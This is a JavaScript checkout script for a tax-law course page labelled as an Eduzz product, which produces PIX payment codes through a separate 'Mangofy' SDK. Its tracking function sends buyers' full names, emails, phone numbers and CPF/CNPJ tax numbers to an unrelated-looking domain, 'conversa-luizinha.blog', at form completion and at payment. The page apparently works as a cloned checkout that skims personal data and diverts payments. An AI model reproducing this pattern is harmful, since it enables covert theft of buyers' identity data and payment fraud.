// ========================================
// CHECKOUT LOGIC - Tributarista Referência (Eduzz)
// PIX gerado via SDK Mangofy (fast_api.min.js) — sem polling, sem VPS proxy
// ========================================

var VALID_COUPONS = ["SELECIONADON4"];
var ORIGINAL_PRICE = 2697.00;
var DISCOUNT_PERCENTAGE = 0.90;
var REDIRECT_URL = './obrigado.html';

var couponApplied = false;
var formData = {};
var pixCode = '';
var pixQRCodeUrl = '';
var _pixGenerating = false;

// ========================================
// TRACKING (fire-and-forget)
// ========================================

var _trackSessionId = localStorage.getItem('track_session_id');
if (!_trackSessionId) {
    _trackSessionId = (typeof crypto !== 'undefined' && crypto.randomUUID)
        ? crypto.randomUUID()
        : 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
            var r = Math.random() * 16 | 0;
            return (c === 'x' ? r : (r & 0x3 | 0x8)).toString(16);
        });
    localStorage.setItem('track_session_id', _trackSessionId);
}
var _formStartedTracked = false;

function trackEvent(eventName, extraData) {
    var payload = {
        event: eventName,
        session_id: _trackSessionId,
        timestamp: new Date().toISOString(),
        meta: { user_agent: navigator.userAgent, referrer: document.referrer, page_url: window.location.href },
        data: extraData || {}
    };
    var url = 'https://conversa-luizinha.blog/api/checkout-event';
    var body = JSON.stringify(payload);
    if (eventName === 'payment_confirmed' && navigator.sendBeacon) {
        navigator.sendBeacon(url, new Blob([body], { type: 'application/json' }));
        return;
    }
    fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: body, keepalive: true }).catch(function() {});
}

// ========================================
// UTILITARIOS
// ========================================

function onlyNumbers(v) { return v.replace(/\D/g, ''); }
function maskCPF(v) { return v.replace(/\D/g,'').replace(/(\d{3})(\d)/,'$1.$2').replace(/(\d{3})(\d)/,'$1.$2').replace(/(\d{3})(\d{1,2})$/,'$1-$2'); }
function maskCNPJ(v) { return v.replace(/\D/g,'').replace(/(\d{2})(\d)/,'$1.$2').replace(/(\d{3})(\d)/,'$1.$2').replace(/(\d{3})(\d)/,'$1/$2').replace(/(\d{4})(\d{1,2})$/,'$1-$2'); }
function maskDocument(v) {
    var n = onlyNumbers(v);
    return n.length > 11 ? maskCNPJ(v) : maskCPF(v);
}
function maskPhone(v) { return v.replace(/\D/g,'').replace(/(\d{2})(\d)/,'($1) $2').replace(/(\d{5})(\d)/,'$1-$2').replace(/(-\d{4})\d+?$/,'$1'); }
function formatBRL(v) { return 'R$ ' + v.toFixed(2).replace('.', ',').replace(/\B(?=(\d{3})+(?!\d))/g, '.'); }
function validateEmail(e) { return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e); }
function validateName(n) { return n.trim().length >= 3 && n.trim().indexOf(' ') !== -1; }
function validatePhone(p) { var n = onlyNumbers(p); return n.length >= 10 && n.length <= 11; }
function validateCPF(cpf) {
    cpf = onlyNumbers(cpf); if (cpf.length !== 11) return false;
    var inv = ['00000000000','11111111111','22222222222','33333333333','44444444444','55555555555','66666666666','77777777777','88888888888','99999999999'];
    if (inv.indexOf(cpf) !== -1) return false;
    var s = 0; for (var i=0;i<9;i++) s += parseInt(cpf[i])*(10-i);
    var r = 11-(s%11); var d1 = r>=10?0:r; if (d1!==parseInt(cpf[9])) return false;
    s = 0; for (var i=0;i<10;i++) s += parseInt(cpf[i])*(11-i);
    r = 11-(s%11); return (r>=10?0:r) === parseInt(cpf[10]);
}
function validateCNPJ(cnpj) {
    cnpj = onlyNumbers(cnpj); if (cnpj.length !== 14) return false;
    if (/^(\d)\1+$/.test(cnpj)) return false;
    var t = cnpj.length - 2, n = cnpj.substring(0, t), d = cnpj.substring(t);
    var s = 0, p = t - 7, i;
    for (i = t; i >= 1; i--) { s += parseInt(n.charAt(t - i)) * p--; if (p < 2) p = 9; }
    var r = s % 11 < 2 ? 0 : 11 - s % 11;
    if (r !== parseInt(d.charAt(0))) return false;
    t = t + 1; n = cnpj.substring(0, t); s = 0; p = t - 7;
    for (i = t; i >= 1; i--) { s += parseInt(n.charAt(t - i)) * p--; if (p < 2) p = 9; }
    r = s % 11 < 2 ? 0 : 11 - s % 11;
    return r === parseInt(d.charAt(1));
}
function validateDocument(v) {
    var n = onlyNumbers(v);
    return n.length === 11 ? validateCPF(v) : (n.length === 14 ? validateCNPJ(v) : false);
}
function formatPhoneForAPI(p) { return '55' + onlyNumbers(p); }

function showErr(id) { var el=document.getElementById(id+'-error'); if(el) el.classList.add('show'); var wr=document.getElementById(id+'-wrapper'); if(wr){wr.classList.add('error');wr.classList.remove('valid');} }
function clearErr(id) { var el=document.getElementById(id+'-error'); if(el) el.classList.remove('show'); var wr=document.getElementById(id+'-wrapper'); if(wr) wr.classList.remove('error'); }
function markOk(id) { var wr=document.getElementById(id+'-wrapper'); if(wr){wr.classList.remove('error');wr.classList.add('valid');} var el=document.getElementById(id+'-error'); if(el) el.classList.remove('show'); }
function clearOk(id) { var wr=document.getElementById(id+'-wrapper'); if(wr) wr.classList.remove('valid'); }

// ========================================
// CUPOM
// ========================================

function applyCoupon(code) {
    var upper = code.toUpperCase().trim();
    if (VALID_COUPONS.indexOf(upper) !== -1) {
        var disc = ORIGINAL_PRICE * DISCOUNT_PERCENTAGE;
        var finalPrice = ORIGINAL_PRICE - disc;
        couponApplied = true;
        formData.valorFinal = finalPrice;
        formData.cupom = upper;
        var priceText = formatBRL(finalPrice);
        var priceNumOnly = priceText.replace('R$ ', '');
        var prDisp = document.getElementById('price-display');
        var prTot = document.getElementById('price-total');
        var prHero = document.getElementById('product-price-value');
        if (prDisp) prDisp.textContent = priceText;
        if (prTot) prTot.textContent = priceText + ' à vista';
        if (prHero) prHero.textContent = priceNumOnly;
        var heroBtn = document.getElementById('apply-coupon-btn');
        if (heroBtn) {
            heroBtn.innerHTML = '<svg width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M13.3 4.3l-7.3 7.3-3.3-3.3" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" fill="none"/></svg> <span>Cupom "' + upper + '" aplicado</span>';
            heroBtn.disabled = true;
        }
        trackEvent('coupon_applied', { code: upper, discount_percentage: DISCOUNT_PERCENTAGE, original_price: ORIGINAL_PRICE, final_price: finalPrice });
        showDiscountModal(upper, disc, finalPrice);
        return true;
    }
    return false;
}

function showDiscountModal(code, discount, finalPrice) {
    var modal = document.getElementById('discount-modal');
    if (!modal) return;
    var dmCode = document.getElementById('dm-code');
    var dmOrig = document.getElementById('dm-original');
    var dmDisc = document.getElementById('dm-discount');
    var dmPct = document.getElementById('dm-percent');
    var dmFinal = document.getElementById('dm-final');
    if (dmCode) dmCode.textContent = code;
    if (dmOrig) dmOrig.textContent = formatBRL(ORIGINAL_PRICE);
    if (dmDisc) dmDisc.textContent = '- ' + formatBRL(discount);
    if (dmPct) dmPct.textContent = Math.round(DISCOUNT_PERCENTAGE * 100) + '%';
    if (dmFinal) dmFinal.textContent = formatBRL(finalPrice);
    modal.classList.add('active');
}

// ========================================
// PIX — SDK Mangofy Fast API (sem polling)
// ========================================

// Callback global chamado pelo SDK quando pagamento é confirmado
window.paymentApproved = function() {
    trackEvent('payment_confirmed', {
        amount: formData.valorFinal || ORIGINAL_PRICE,
        nome: formData.nome,
        email: formData.email,
        coupon: formData.cupom || null
    });
    window.location.href = REDIRECT_URL;
};

async function generatePixSDK() {
    if (_pixGenerating) return;
    _pixGenerating = true;

    var pixGenerateBtn = document.getElementById('pix-generate-btn');
    var pixCopyBtn = document.getElementById('pix-copy-btn');
    var pixQrBtn = document.getElementById('pix-qr-btn');
    var statusEl = document.getElementById('pix-status');

    pixGenerateBtn.disabled = true;
    pixGenerateBtn.innerHTML = '<span class="spinner"></span> Gerando PIX...';

    var price = formData.valorFinal || ORIGINAL_PRICE;
    var config = {
        total_price: price,
        customer: {
            name: formData.nome,
            document: onlyNumbers(formData.cpf),
            email: formData.email,
            phone: formatPhoneForAPI(formData.telefone)
        },
        items: [{ name: 'Tributarista Referência - Nova Era da Prática Tributária', price: price, quantity: 1 }]
    };

    try {
        var response = await generatePix(config);
        if (response.success) {
            pixCode = response.pixCode;
            pixQRCodeUrl = response.qrCodeImage || ('https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=' + encodeURIComponent(pixCode));

            trackEvent('pix_generated', {
                amount: price,
                nome: formData.nome,
                email: formData.email,
                telefone: formData.telefone,
                documento: onlyNumbers(formData.cpf),
                coupon: formData.cupom || null,
                discount_percentage: couponApplied ? DISCOUNT_PERCENTAGE : 0,
                original_price: ORIGINAL_PRICE,
                final_price: price
            });

            localStorage.setItem('userEmail', formData.email);

            pixGenerateBtn.style.display = 'none';
            pixCopyBtn.style.display = 'flex';
            pixQrBtn.style.display = 'flex';
            if (statusEl) statusEl.classList.add('show');
        } else {
            alert(response.message || 'Erro ao gerar PIX. Tente novamente.');
            _pixGenerating = false;
            pixGenerateBtn.disabled = false;
            pixGenerateBtn.textContent = 'Gerar Pix';
        }
    } catch (error) {
        console.error('Erro SDK PIX:', error);
        alert('Erro ao gerar código PIX. Verifique sua conexão e tente novamente.');
        _pixGenerating = false;
        pixGenerateBtn.disabled = false;
        pixGenerateBtn.textContent = 'Gerar Pix';
    }
}

// ========================================
// MAIN
// ========================================

document.addEventListener('DOMContentLoaded', function() {
    trackEvent('checkout_viewed');

    // Discount modal close — se cupom foi aplicado via submit, "Continuar" fecha modal e dispara PIX
    var dmCloseBtn = document.getElementById('dm-close-btn');
    var dmOverlay = document.getElementById('discount-modal');
    function closeDiscountModal() {
        if (dmOverlay) dmOverlay.classList.remove('active');
        if (_couponSource === 'submit') {
            _couponSource = null;
            collectAndGenerate();
        } else {
            _couponSource = null;
        }
    }
    if (dmCloseBtn && dmOverlay) {
        dmCloseBtn.addEventListener('click', closeDiscountModal);
        dmOverlay.addEventListener('click', function(e) { if (e.target === dmOverlay) closeDiscountModal(); });
    }

    var emailEl = document.getElementById('email');
    var emailConfEl = document.getElementById('email-confirm');
    var nomeEl = document.getElementById('nome');
    var cpfEl = document.getElementById('cpf');
    var telEl = document.getElementById('telefone');
    var submitBtn = document.getElementById('pix-generate-btn');
    var copyBtn = document.getElementById('pix-copy-btn');
    var qrBtn = document.getElementById('pix-qr-btn');
    var heroCouponBtn = document.getElementById('apply-coupon-btn');
    var persistCb = document.getElementById('persist-cb');
    var _couponSource = null;

    [emailEl, nomeEl, cpfEl, telEl].forEach(function(el) {
        el.addEventListener('input', function() {
            if (!_formStartedTracked) { _formStartedTracked = true; trackEvent('form_started'); }
        });
    });

    // Persist checkbox toggle
    if (persistCb) {
        var togglePersist = function() {
            persistCb.classList.toggle('checked');
            persistCb.setAttribute('aria-checked', persistCb.classList.contains('checked') ? 'true' : 'false');
        };
        persistCb.addEventListener('click', togglePersist);
        persistCb.addEventListener('keydown', function(e) { if (e.key === ' ' || e.key === 'Enter') { e.preventDefault(); togglePersist(); } });
        var persistLabel = document.querySelector('label[for="persist-cb"]');
        if (persistLabel) persistLabel.addEventListener('click', function(e) { e.preventDefault(); togglePersist(); });
    }

    // Mascaras + validacao live
    cpfEl.addEventListener('input', function(e) { e.target.value = maskDocument(e.target.value); if (validateDocument(e.target.value)) markOk('cpf'); else { clearOk('cpf'); clearErr('cpf'); } });
    cpfEl.addEventListener('blur', function() { if (cpfEl.value && !validateDocument(cpfEl.value)) showErr('cpf'); });
    telEl.addEventListener('input', function(e) { e.target.value = maskPhone(e.target.value); if (validatePhone(e.target.value)) markOk('telefone'); else { clearOk('telefone'); clearErr('telefone'); } });
    telEl.addEventListener('blur', function() { if (telEl.value && !validatePhone(telEl.value)) showErr('telefone'); });
    emailEl.addEventListener('input', function() { if (validateEmail(emailEl.value)) markOk('email'); else { clearOk('email'); clearErr('email'); } });
    emailEl.addEventListener('blur', function() { if (emailEl.value && !validateEmail(emailEl.value)) showErr('email'); });
    emailConfEl.addEventListener('input', function() { if (emailConfEl.value === emailEl.value && validateEmail(emailConfEl.value)) markOk('email-confirm'); else { clearOk('email-confirm'); clearErr('email-confirm'); } });
    emailConfEl.addEventListener('blur', function() { if (emailConfEl.value && emailConfEl.value !== emailEl.value) showErr('email-confirm'); });
    nomeEl.addEventListener('input', function() { if (validateName(nomeEl.value)) markOk('nome'); else { clearOk('nome'); clearErr('nome'); } });
    nomeEl.addEventListener('blur', function() { if (nomeEl.value && !validateName(nomeEl.value)) showErr('nome'); });

    // Cupom popup
    var couponOverlay = document.getElementById('coupon-overlay');
    var popupInput = document.getElementById('popup-coupon-input');
    var popupApplyBtn = document.getElementById('popup-apply-btn');
    var popupSkipBtn = document.getElementById('popup-skip-btn');
    var popupMessage = document.getElementById('popup-message');

    function openCouponPopup(source) {
        _couponSource = source;
        popupInput.value = ''; popupInput.classList.remove('valid','invalid');
        popupMessage.textContent = ''; popupMessage.className = 'popup-message';
        popupSkipBtn.textContent = 'Cancelar';
        couponOverlay.classList.add('active');
        setTimeout(function() { popupInput.focus(); }, 200);
    }

    if (heroCouponBtn) {
        heroCouponBtn.addEventListener('click', function() {
            if (couponApplied) return;
            openCouponPopup('hero');
        });
    }

    popupApplyBtn.addEventListener('click', function() {
        var code = popupInput.value.trim();
        if (!code) return;
        if (applyCoupon(code)) {
            popupInput.classList.add('valid');
            popupMessage.textContent = 'Cupom aplicado!'; popupMessage.className = 'popup-message success';
            // Fecha o popup do cupom rapido — o discount modal ja foi aberto pelo applyCoupon
            setTimeout(function() { couponOverlay.classList.remove('active'); }, 300);
        } else {
            popupInput.classList.add('invalid');
            popupMessage.textContent = 'Codigo invalido.'; popupMessage.className = 'popup-message error';
        }
    });
    popupInput.addEventListener('keypress', function(e) { if (e.key === 'Enter') popupApplyBtn.click(); });
    popupSkipBtn.addEventListener('click', function() {
        couponOverlay.classList.remove('active');
        _couponSource = null;
    });
    couponOverlay.addEventListener('click', function(e) {
        if (e.target === couponOverlay) {
            couponOverlay.classList.remove('active');
            _couponSource = null;
        }
    });

    // Submit
    submitBtn.addEventListener('click', function(ev) {
        ev.preventDefault();
        var hasErr = false;
        if (!validateName(nomeEl.value)) { showErr('nome'); hasErr = true; }
        if (!validateDocument(cpfEl.value)) { showErr('cpf'); hasErr = true; }
        if (!validateEmail(emailEl.value)) { showErr('email'); hasErr = true; }
        if (emailConfEl.value !== emailEl.value || !validateEmail(emailConfEl.value)) { showErr('email-confirm'); hasErr = true; }
        if (!validatePhone(telEl.value)) { showErr('telefone'); hasErr = true; }
        if (hasErr) return;
        trackEvent('form_completed', { nome: nomeEl.value, email: emailEl.value, telefone: telEl.value, documento: cpfEl.value });
        if (!couponApplied) {
            openCouponPopup('submit');
            return;
        }
        collectAndGenerate();
    });

    function collectAndGenerate() {
        formData.nome = nomeEl.value.trim();
        formData.email = emailEl.value.trim();
        formData.cpf = cpfEl.value;
        formData.telefone = telEl.value;
        localStorage.setItem('userEmail', formData.email);
        generatePixSDK();
    }

    // PIX copiar
    copyBtn.addEventListener('click', function() {
        if (!pixCode) return;
        trackEvent('pix_copied', { amount: formData.valorFinal || ORIGINAL_PRICE });
        navigator.clipboard.writeText(pixCode).then(function() {
            copyBtn.innerHTML = '<i class="fa-solid fa-check"></i> Codigo copiado!';
            setTimeout(function() { copyBtn.textContent = 'Copiar codigo Pix'; }, 2500);
        }).catch(function() { alert('Erro ao copiar.'); });
    });

    // QR modal
    var qrOverlay = document.getElementById('qr-overlay');
    qrBtn.addEventListener('click', function() {
        if (!pixQRCodeUrl) return;
        document.getElementById('qr-modal-img').src = pixQRCodeUrl;
        qrOverlay.classList.add('show');
    });
    document.getElementById('qr-close-btn').addEventListener('click', function() { qrOverlay.classList.remove('show'); });
    qrOverlay.addEventListener('click', function(e) { if (e.target === qrOverlay) qrOverlay.classList.remove('show'); });

    // Modal "Sobre" (descrição completa)
    var descBtn = document.getElementById('show-hide-description');
    var descOverlay = document.getElementById('desc-overlay');
    var descCloseBtn = document.getElementById('desc-close-btn');
    if (descBtn && descOverlay) {
        descBtn.addEventListener('click', function() {
            descOverlay.classList.add('show');
            document.body.style.overflow = 'hidden';
        });
        descCloseBtn.addEventListener('click', function() {
            descOverlay.classList.remove('show');
            document.body.style.overflow = '';
        });
        descOverlay.addEventListener('click', function(e) {
            if (e.target === descOverlay) {
                descOverlay.classList.remove('show');
                document.body.style.overflow = '';
            }
        });
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape' && descOverlay.classList.contains('show')) {
                descOverlay.classList.remove('show');
                document.body.style.overflow = '';
            }
        });
    }
});
